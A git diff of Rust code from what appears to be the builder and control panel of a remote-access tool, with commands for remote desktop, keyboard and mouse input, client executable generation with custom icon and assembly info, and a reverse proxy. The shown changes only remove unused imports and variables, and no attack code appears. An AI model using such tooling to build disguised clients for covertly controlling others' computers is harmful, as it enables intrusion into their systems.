@@ -20,10 +20,10 @@ use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
-use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, FileData};
+use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process};
 
 use object::{ Object, ObjectSection };
-use std::fs::{ File as FsFile };
+use std::fs::File;
 use std::io::Write;
 use rmp_serde::Serializer;
 use std::process::Command;
@@ -176,7 +176,6 @@ pub async fn build_client(
     assembly_info: AssemblyInfo,
     enable_icon: bool,
     icon_path: &str,
-    tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
     let log = Log { event_type: "build_client".to_string(), message: "Building client...".to_string() };
@@ -218,12 +217,9 @@ pub async fn build_client(
         output_data[offset..offset + size].copy_from_slice(&new_data);
     }
 
-    let mut file = FsFile::create("target/debug/Client_built.exe").unwrap();
+    let mut file = File::create("target/debug/Client_built.exe").unwrap();
     let _ = file.write_all(&output_data);
     drop(file);
-
-
-    let mut written_file_path: String = "target/debug/Client_built.exe".to_string();
 
     let mut cmd = Command::new("target/rcedit.exe");
 
@@ -741,7 +737,7 @@ pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriSt
 }
 
 #[tauri::command]
-pub async fn read_icon(path: &str, app_handle: AppHandle) -> Result<String, String> {
+pub async fn read_icon(path: &str, _app_handle: AppHandle) -> Result<String, String> {
     let icon = fs::read(path)
         .map_err(|e| format!("Failed to read icon: {}", e))?;
 
@@ -752,7 +748,7 @@ pub async fn read_icon(path: &str, app_handle: AppHandle) -> Result<String, Stri
 
 #[tauri::command]
 pub async fn read_exe(path: &str) -> Result<AssemblyInfo, String> {
-    let exe = fs::read(path)
+    let _ = fs::read(path)
         .map_err(|e| format!("Failed to read exe: {}", e))?;
 
     let info = get_assembly_info(path, "target/rcedit.exe").unwrap();
